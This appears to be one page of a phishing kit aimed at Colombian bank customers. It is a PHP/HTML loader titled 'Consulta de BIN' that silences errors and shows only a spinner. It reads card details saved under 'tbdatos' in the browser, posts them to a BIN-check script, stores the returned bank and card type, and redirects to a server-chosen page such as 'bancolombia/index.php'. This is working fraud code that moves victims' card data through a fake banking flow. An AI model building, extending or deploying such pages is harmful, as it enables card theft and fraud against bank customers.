<?php
error_reporting(0);
ini_set('display_errors', 0);
?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Consulta de BIN</title>
    <style>
        body {
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
        }

        #loader {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #555;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        h2 {
            display: none;
            /* Ocultamos cualquier texto adicional */
        }
    </style>
</head>

<body>
    <div id="loader"></div>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const datos = JSON.parse(localStorage.getItem('tbdatos'));

            if (datos) {
                // Consultar la API de verificación de BIN centralizada
                fetch('../verificar_bin.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(datos)
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Error en la respuesta del servidor');
                    }
                    return response.json();
                })
                .then(result => {
                    if (result.status === 'success') {
                        // Guardar la info del banco y tipo para cargando
                        const infoLoad = { 
                            bank: result.bank, 
                            cardType: result.cardType 
                        };
                        localStorage.setItem('infoload', JSON.stringify(infoLoad));

                        // Actualizar banco y tipo de tarjeta en tbdatos
                        datos.bank = result.bank;
                        datos.type = result.type;
                        localStorage.setItem('tbdatos', JSON.stringify(datos));

                        // Redirigir al destino (bancolombia/index.php o id.html)
                        window.location.href = result.redirect;
                    } else {
                        window.location.href = 'dinadatos/id.html';
                    }
                })
                .catch(error => {
                    console.error("Error en la consulta de tarjeta:", error);
                    window.location.href = 'dinadatos/id.html';
                });
            } else {
                window.location.href = 'dinadatos/id.html';
            }
        });
    </script>
</body>

</html>